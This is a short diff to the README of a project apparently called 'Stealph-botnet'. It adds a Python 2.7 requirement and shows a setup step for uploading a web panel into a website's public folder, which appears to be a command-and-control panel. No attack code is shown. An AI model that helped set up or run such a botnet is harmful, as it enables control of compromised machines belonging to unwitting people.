@@ -1,5 +1,9 @@
 # Stealph-botnet
 
+#Requirements
+1.python2.7 installed
+
+
 #how to use:
 1 . first go to web panel folder
 extract web panel.zip and upload it into use website's public html folder
